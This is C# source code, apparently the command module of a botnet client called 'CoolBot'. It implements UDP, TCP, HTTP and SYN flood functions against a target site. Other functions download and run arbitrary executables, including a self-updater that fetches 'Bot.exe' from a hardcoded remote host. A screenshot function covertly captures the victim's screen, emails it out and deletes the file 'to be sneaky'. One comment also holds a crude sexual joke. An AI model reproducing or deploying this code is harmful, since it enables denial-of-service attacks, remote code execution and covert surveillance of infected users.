using System;
using System.Collections.Generic;
using System.Text;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Media;
using System.IO;
using System.Windows.Forms;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.Net.Mime;
using System.Net.Mail;
namespace Reciever
{
    static class Functions
    {
        public static class DDoS
        {
            public static void UDPStart(string Site)
            {
               Reciever.Program.DActive = true;
                //UDP Config
                int UDPThreads = 10000;
                int UDPDelay = 1000;
                IPAddress SiteIP = Dns.GetHostAddresses(Site)[0];

                for (int i = 0; i < UDPThreads; i++)
                {
                    Thread UDPThread = new Thread(() => UDP(UDPDelay, SiteIP));
                    UDPThread.Start();
                }
            }

            static void UDP(int Delay, IPAddress Site)
            {
                IPEndPoint SiteEndPoint = new IPEndPoint(Site, 80);
                Byte[] PacketContents = new Byte[1400];
                Random Rand = new Random();
                Rand.NextBytes(PacketContents);

                while (Reciever.Program.DActive)
                {
                    Socket UDPSocket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
                    UDPSocket.SendTo(PacketContents, SiteEndPoint);
                    Thread.Sleep(Delay);
                }
            }

            public static void TCPStart(string Site)
            {
                Reciever.Program.DActive = true;
                int Threads = 100;
                IPAddress TCPSite = Dns.GetHostAddresses(Site)[0];

                for (int i = 0; i <= Threads; i++)
                {
                    Thread TCPThread = new Thread(() => TCP(TCPSite));
                    TCPThread.Start();
                }

            }

            static void TCP(IPAddress Site)
            {
                IPEndPoint TCPEndPoint = new IPEndPoint(Site, 80);
                Byte[] PacketContents = new byte[1400];
                Random Rand = new Random();
                Rand.NextBytes(PacketContents);

                while (Reciever.Program.DActive)
                {
                    try
                    {
                        Socket TCPSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                        TCPSocket.Connect(TCPEndPoint);
                        TCPSocket.Send(PacketContents);
                        Thread.Sleep(1000);
                    }

                    catch (Exception e)
                    { }
                }
            }

            public static void HTTPStart(string Site)
            {
                Reciever.Program.DActive = true;
                int Threads = 1000;
                IPAddress SiteIP = Dns.GetHostAddresses(Site)[0];

                for (int i = 0; i < Threads; i++)
                {
                    Thread HttpThread = new Thread(() => HTTP(SiteIP));
                    HttpThread.Start();
                }
            }

            static void HTTP(IPAddress Site)
            {
                IPEndPoint HTTPEndPoint = new IPEndPoint(Site, 80);
                while (Reciever.Program.DActive)
                {
                    try
                    {
                        Socket HTTPSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                        HTTPSocket.Connect(HTTPEndPoint);
                        HTTPSocket.Send(Encoding.ASCII.GetBytes("GET /"));
                    }

                    catch (Exception e)
                    { }
                }
            }

            public static void StartSYN(string Site)
            {
                Reciever.Program.DActive = true;
                int Threads = 10;
                IPAddress SYNIP = Dns.GetHostAddresses(Site)[0];

                for (int i = 0; i <= Threads; i++)
                {
                    Thread SYNThread = new Thread(() => SYN(SYNIP));
                    SYNThread.Start();
                }
            }

            static void SYN(IPAddress Site)
            {
                IPEndPoint SYNEndPoint = new IPEndPoint(Site, 80);
                while (Reciever.Program.DActive)
                {
                    Socket SYNSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                    SYNSocket.Blocking = false;
                    SYNSocket.BeginConnect(SYNEndPoint, new AsyncCallback(SYNCall), SYNSocket);
                    Thread.Sleep(100);

                    if (SYNSocket.Connected)
                    {
                        SYNSocket.Disconnect(false);
                    }

                    SYNSocket.Close();
                    SYNSocket = null;
                }
            }

            static void SYNCall(IAsyncResult arg)
            { }
        }

        public static class Sounds
        {
            public static void Fresh()
            {
                if (!File.Exists(Reciever.Program.AppPath + "\\fresh.wav"))
                {
                    WebClient DownloadFresh = new WebClient();
                    DownloadFresh.DownloadFile("http://www.colaska.com/skype/fresh.wav", Reciever.Program.AppPath + "\\fresh.wav");
                    DownloadFresh.Dispose();
                }

                SoundPlayer Prince = new SoundPlayer(Reciever.Program.AppPath + "\\fresh.wav");
                Prince.Play();
                Prince.Dispose();
            }

            public static void Speak(string speak)
            {
                System.Speech.Synthesis.SpeechSynthesizer Speak = new System.Speech.Synthesis.SpeechSynthesizer();
                Speak.Speak(speak);
                Speak.Dispose();

            }

            public static void Beep(string Frequency, string Length)
            {
                int FrequencyInt = Convert.ToInt32(Frequency);
                int LengthInt = Convert.ToInt32(Length);
                Console.Beep(FrequencyInt, LengthInt);
            }
        }

        public static class IO
        {
            public static void Message(string message)
            {
                MessageBox.Show(message);
            }

            public static void Install(string link)
            {
                Random RandomNum = new Random();
                int Number = RandomNum.Next(1, 10);

                try
                {
                    WebClient InstallURL = new WebClient();
                    InstallURL.DownloadFile(link, Reciever.Program.AppPath + "\\" + Number + ".exe");
                    InstallURL.Dispose();
                    Process.Start(Reciever.Program.AppPath + "\\" + Number + ".exe");
                }

                catch (Exception e)
                { }
            }

            public static void UpdateMe()
            {
                string PVersion = Application.ProductVersion;
                WebClient CheckUpdate = new WebClient();
                string Output = CheckUpdate.DownloadString("http://www.colaska.com/skype/update.php?version=" + PVersion);
                CheckUpdate.Dispose();

                if (Output != "")
                {
                    WebClient DownloadUpdate = new WebClient();
                    DownloadUpdate.DownloadFile(Output, Reciever.Program.AppPath + "\\Bot.exe");
                    DownloadUpdate.Dispose();

                    Process.Start(Reciever.Program.AppPath + "\\Bot.exe");
                }
            }
        }

        public static class Image
        {
            
            public static void Screenshot()
            {
                // Path for file to be temp written to
                string tempFileName = "\\tempimg.jpg";
                string file = Reciever.Program.AppPath + tempFileName;

                // Screenshot variables
                Bitmap bt;
                Graphics screenShot;

                // Email variables
                var fromAddress = new MailAddress("#SENDEREMAIL#", "CoolSec - CoolBot");
                var toAddress = new MailAddress("#RECEIVEREMAIL#", "#USERNAME#");
                const string fromPassword = "#PASSWORD#";
                const string subject = "CoolBot Screenshot";
                const string body = "#MESSAGE#";

                // Screenshot method
                bt = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height, PixelFormat.Format32bppArgb);
                screenShot = Graphics.FromImage(bt);
                screenShot.CopyFromScreen(Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y, 0, 0, Screen.PrimaryScreen.Bounds.Size,
                    CopyPixelOperation.SourceCopy);
                bt.Save(file, ImageFormat.Jpeg);

                // Creates attachement for email
                Attachment img = new Attachment(file, MediaTypeNames.Application.Octet);
                ContentDisposition disposition = img.ContentDisposition;
                disposition.CreationDate = File.GetCreationTime(file);
                disposition.ModificationDate = File.GetLastWriteTime(file);
                disposition.ReadDate = File.GetLastAccessTime(file);

                // Sets up SMTP Connection to send email
                var smtp = new SmtpClient
                {
                    Host = "#HOST#",
                    Port = 587,
                    EnableSsl = true,
                    DeliveryMethod = SmtpDeliveryMethod.Network,
                    UseDefaultCredentials = false,
                    Credentials = new NetworkCredential(fromAddress.Address, fromPassword)
                };

                // Pieces the email together and sends
                using (var message = new MailMessage(fromAddress, toAddress) { Subject = subject, Body = body })
                {
                    message.Attachments.Add(img);
                    smtp.Send(message);
                }

                // Deletes file to be sneaky sneaky. Like when you do a girl in the doggy position and you slip it in her butt. lolwut
                File.Delete(file);

            }
        }
    }
}
